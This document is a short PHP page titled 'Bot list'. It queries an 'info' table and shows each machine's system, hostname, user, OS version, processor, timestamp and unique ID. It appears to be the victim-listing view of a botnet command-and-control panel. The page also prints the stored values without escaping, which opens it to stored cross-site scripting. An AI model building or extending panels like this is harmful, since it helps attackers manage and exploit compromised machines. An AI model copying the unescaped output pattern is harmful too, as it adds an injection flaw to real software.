
<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<script src="js/bootstrap.min.js"></script>
	<title>Bot list</title>
</head>
<body>
<?php
include 'header.php'
?>
    <div class="table-responsive">
  <table class="table" border="5" BORDERCOLOR=#92FAF1>
      <tr>
    <th>id</th>
    <th>SYSTEM</th> 
    <th>NODE</th>
    <th>User</th>
    <th>RELEASE</th>
    <th>VERSION</th> 
    <th>MACHINE</th>
    <th>PROCESSOR</th>
    <th>TIME/DATE</th> 
    <th>UNIQUE ID</th>
</tr>


<?php
 $query = mysqli_query($conn, "SELECT * FROM info");
  while ($row = mysqli_fetch_array($query))
  	# code...
  {
  $id = $row['id'];
   $Syst3m = $row['Syst3m'];
    $node = $row['node'];
    $Us3r = $row['Us3r'];
     $r3lease = $row['r3lease'];
      $version = $row['version'];
       $machine = $row['machine'];
        $processor = $row['processor'];
         $tim3_date = $row['tim3_date'];
          $UNIQUE_ID = $row['UNIQUE_ID'];
?>



  
 
  <tr>
    <td><?php echo $id ?></td>
    <td><?php echo $Syst3m ?></td> 
    <td><?php echo $node ?></td>
    <td><?php echo $Us3r ?></td>
    <td><?php echo $r3lease ?></td>
    <td><?php echo $version ?></td>
    <td><?php echo $machine ?></td> 
    <td><?php echo $processor ?></td>
    <td>E<?php echo $tim3_date ?></td>
    <td><?php echo $UNIQUE_ID ?></td> 
    
  </tr>

<?php         
}
    ?>
      </table>
</div>
</body>
</html>